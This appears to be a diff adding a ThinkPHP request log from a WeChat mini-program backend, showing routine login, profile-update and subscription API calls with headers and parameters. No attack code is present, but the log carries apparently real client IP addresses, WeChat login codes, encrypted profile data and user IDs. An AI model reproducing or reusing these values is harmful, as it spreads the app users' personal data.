+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T15:50:23+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/user/updateUser?code=0a1sNE1w39Ijk13NOO0w3wJjbH0sNE1n&iv=WX5qREGVt%2FRzi0AlrVRohQ%3D%3D&encryptedData=vD4ig8rbgEZ8U3e9Z4x2hWkukfXJgoVwk%2BQsSTra2CDA3mU4BQ%2BWEwDO%2Fqu6kZm5lObSJs582GroeToCDXIi1ZPNlr2WHaq3UiLnuvtsLVh0UWOxYyeFzxyhHOx4gUtxtPC78x7WDQ3Do1%2BoKGCOU2usz3FUiEBz7wclzlrTIjcOUJuCi5svRnOa5xBNSQghyANLgLTRxxHHafN%2FWhOvX7IWdoRNdyNkSeCGVoMybjwrqlMHN2AX8EKwVJwzVNYr0gHSVn5Rb2gnFGNCFHAFTlRSdG3O%2F0GHA7A24sARr8LtKwr2HoAO%2BVLo406epFB1Cdsr73Z3K7ailXfJcWUMGGaJpySqizN8EWoJFT0ojAUmW8wrJGxnagyI1V6%2FZ8SJNN5XTMsb8eoDMgqIDZEMyHyHOuTqI7aGgT%2FqtsYak8mVpt6b9jb4DLgOn6G69VKRlkRVzIZsLrgMlzSx7javYQ%3D%3D
+[运行时间：0.223890s] [吞吐率：4.47req/s] [内存消耗：4,392.24kb] [文件加载：95]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002536s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000993s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000039s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'updateUser',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'code' => '0a1sNE1w39Ijk13NOO0w3wJjbH0sNE1n',
+  'iv' => 'WX5qREGVt/Rzi0AlrVRohQ==',
+  'encryptedData' => 'vD4ig8rbgEZ8U3e9Z4x2hWkukfXJgoVwk+QsSTra2CDA3mU4BQ+WEwDO/qu6kZm5lObSJs582GroeToCDXIi1ZPNlr2WHaq3UiLnuvtsLVh0UWOxYyeFzxyhHOx4gUtxtPC78x7WDQ3Do1+oKGCOU2usz3FUiEBz7wclzlrTIjcOUJuCi5svRnOa5xBNSQghyANLgLTRxxHHafN/WhOvX7IWdoRNdyNkSeCGVoMybjwrqlMHN2AX8EKwVJwzVNYr0gHSVn5Rb2gnFGNCFHAFTlRSdG3O/0GHA7A24sARr8LtKwr2HoAO+VLo406epFB1Cdsr73Z3K7ailXfJcWUMGGaJpySqizN8EWoJFT0ojAUmW8wrJGxnagyI1V6/Z8SJNN5XTMsb8eoDMgqIDZEMyHyHOuTqI7aGgT/qtsYak8mVpt6b9jb4DLgOn6G69VKRlkRVzIZsLrgMlzSx7javYQ==',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002394s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->updateUser[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T15:51:18+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/home?user_id=3
+[运行时间：0.094053s] [吞吐率：10.63req/s] [内存消耗：4,109.62kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000035s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002452s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001001s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000041s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '3',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002255s ]
+[ info ] [ RUN ] app\api\controller\Home->index[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T15:51:18+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/user/login?code=0a1gLC000U2UDQ109m1000Pyyc0gLC0G
+[运行时间：0.261653s] [吞吐率：3.82req/s] [内存消耗：4,382.34kb] [文件加载：93]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000035s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002435s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000965s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000041s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'code' => '0a1gLC000U2UDQ109m1000Pyyc0gLC0G',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002270s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->login[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T16:09:56+08:00 ] 183.200.14.222 GET 001.shanxi0357.cn/api/home?user_id=5
+[运行时间：0.091674s] [吞吐率：10.91req/s] [内存消耗：4,111.00kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000034s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002584s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000924s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000047s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; M2104K10AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/5249 MMWEBSDK/20230701 MMWEBID/1955 MicroMessenger/8.0.40.2420(0x28002855) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '5',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002509s ]
+[ info ] [ RUN ] app\api\controller\Home->index[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T16:09:57+08:00 ] 183.200.14.222 GET 001.shanxi0357.cn/api/user/login?code=0f1u8v2w38ROh13pLL0w38x7gm4u8v2D
+[运行时间：0.290105s] [吞吐率：3.45req/s] [内存消耗：4,383.47kb] [文件加载：93]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000038s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002823s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000888s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000041s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; M2104K10AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/5249 MMWEBSDK/20230701 MMWEBID/1955 MicroMessenger/8.0.40.2420(0x28002855) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'code' => '0f1u8v2w38ROh13pLL0w38x7gm4u8v2D',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002258s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->login[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T16:10:01+08:00 ] 183.200.14.222 GET 001.shanxi0357.cn/api/user/subscription?type=0&user_id=5
+[运行时间：0.071178s] [吞吐率：14.05req/s] [内存消耗：4,061.20kb] [文件加载：89]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000046s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002745s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001051s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000044s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'subscription',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; M2104K10AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/5249 MMWEBSDK/20230701 MMWEBID/1955 MicroMessenger/8.0.40.2420(0x28002855) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'type' => '0',
+  'user_id' => '5',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002402s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->subscription[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T16:10:02+08:00 ] 183.200.14.222 GET 001.shanxi0357.cn/api/user/subscription?type=1&user_id=5
+[运行时间：0.069141s] [吞吐率：14.46req/s] [内存消耗：4,061.20kb] [文件加载：89]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000034s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002618s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000987s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000058s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'subscription',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; M2104K10AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/5249 MMWEBSDK/20230701 MMWEBID/1955 MicroMessenger/8.0.40.2420(0x28002855) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'type' => '1',
+  'user_id' => '5',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002375s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->subscription[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T16:10:03+08:00 ] 183.200.14.222 GET 001.shanxi0357.cn/api/user/subscription?type=2&user_id=5
+[运行时间：0.067705s] [吞吐率：14.77req/s] [内存消耗：4,061.20kb] [文件加载：89]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000036s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002441s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001038s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000066s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'subscription',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; M2104K10AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/5249 MMWEBSDK/20230701 MMWEBID/1955 MicroMessenger/8.0.40.2420(0x28002855) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'type' => '2',
+  'user_id' => '5',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002387s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->subscription[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T16:11:26+08:00 ] 183.200.14.222 GET 001.shanxi0357.cn/api/user/updateUser?code=0d1SkeGa1fsRYF0X4CHa1eUsSb1SkeGT&iv=98MU9DvOSMvPxPjoridUyw%3D%3D&encryptedData=g4gWISBWuEE4hnFwD9xx%2FUTkahlspGzzm506q7jb51VJJwIfGHq5Hsba7QCD0UO959xOaUZldt%2F2Z%2BQOrsz%2B86ydT73l1jRK%2F7pRuvyK6829bVf1yMCDqbJ177yGQvzDGI%2BYR8BXOZ14PO%2BSapBA61Z4KihCt6P3%2FZmVIMyx5kW%2FKzYg4II7TGBPqKM%2FN9Sw8tAHWiMn38Jls9VtSnAqrZ9SEsZq71fsr1bmt%2FhXOiJVD3Oyp767hpr4UG79z7ZAaQuDm0pxsbz%2F9B5XTcLbxx47xPqNzjoG%2BCwobUZ3DO3qDBAvqMISDtmlhLfJCossJnA6cxonvLlHqxI8bIzR8NsP09C7zanAJ2Q8GQEMGfvSId3QEK9zYE%2BUcK07mghsH8He2isJkRNbe0NjnJss27tGnVEgaKu99qxd%2Bw4byAmwZbMVj5uX4P1ajUGgmdEGLQnS711denYmcqaxJuh5qQ%3D%3D
+[运行时间：0.298469s] [吞吐率：3.35req/s] [内存消耗：4,393.38kb] [文件加载：95]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000046s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003970s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001270s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000059s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'updateUser',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; M2104K10AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/5249 MMWEBSDK/20230701 MMWEBID/1955 MicroMessenger/8.0.40.2420(0x28002855) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'code' => '0d1SkeGa1fsRYF0X4CHa1eUsSb1SkeGT',
+  'iv' => '98MU9DvOSMvPxPjoridUyw==',
+  'encryptedData' => 'g4gWISBWuEE4hnFwD9xx/UTkahlspGzzm506q7jb51VJJwIfGHq5Hsba7QCD0UO959xOaUZldt/2Z+QOrsz+86ydT73l1jRK/7pRuvyK6829bVf1yMCDqbJ177yGQvzDGI+YR8BXOZ14PO+SapBA61Z4KihCt6P3/ZmVIMyx5kW/KzYg4II7TGBPqKM/N9Sw8tAHWiMn38Jls9VtSnAqrZ9SEsZq71fsr1bmt/hXOiJVD3Oyp767hpr4UG79z7ZAaQuDm0pxsbz/9B5XTcLbxx47xPqNzjoG+CwobUZ3DO3qDBAvqMISDtmlhLfJCossJnA6cxonvLlHqxI8bIzR8NsP09C7zanAJ2Q8GQEMGfvSId3QEK9zYE+UcK07mghsH8He2isJkRNbe0NjnJss27tGnVEgaKu99qxd+w4byAmwZbMVj5uX4P1ajUGgmdEGLQnS711denYmcqaxJuh5qQ==',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.003286s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->updateUser[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T16:11:28+08:00 ] 183.200.14.222 GET 001.shanxi0357.cn/api/home/getDetail?id=24
+[运行时间：0.071642s] [吞吐率：13.96req/s] [内存消耗：4,100.09kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000040s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002591s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000979s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000068s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => 'getDetail',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; M2104K10AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/5249 MMWEBSDK/20230701 MMWEBID/1955 MicroMessenger/8.0.40.2420(0x28002855) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => '24',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002358s ]
+[ info ] [ RUN ] app\api\controller\Home->getDetail[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T16:11:30+08:00 ] 183.200.14.222 GET 001.shanxi0357.cn/api/user/subscription?type=4&user_id=5
+[运行时间：0.068587s] [吞吐率：14.58req/s] [内存消耗：4,061.20kb] [文件加载：89]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000049s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002496s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000958s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000043s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'subscription',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 13; M2104K10AC Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 XWEB/5249 MMWEBSDK/20230701 MMWEBID/1955 MicroMessenger/8.0.40.2420(0x28002855) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'type' => '4',
+  'user_id' => '5',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002440s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->subscription[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T16:11:32+08:00 ] 183.200.14.222 GET 001.shanxi0357.cn/api/user/subscription?type=5&user_id=5
+[运行时间：0.070343s] [吞吐率：14.22req/s] [内存消耗：4,061.20kb] [文件加载：89]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000043s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002451s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001042s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000042s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'subscription',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
